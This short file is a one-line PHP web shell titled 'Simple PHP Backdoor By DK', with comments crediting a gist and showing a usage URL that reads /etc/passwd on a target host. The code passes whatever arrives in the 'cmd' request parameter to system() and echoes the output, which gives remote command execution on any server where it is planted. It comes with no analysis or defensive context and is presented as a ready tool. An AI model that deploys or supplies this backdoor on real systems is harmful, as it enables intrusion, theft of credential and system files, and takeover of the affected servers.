<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- from https://gist.github.com/sente/4dbb2b7bdda2647ba80b -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
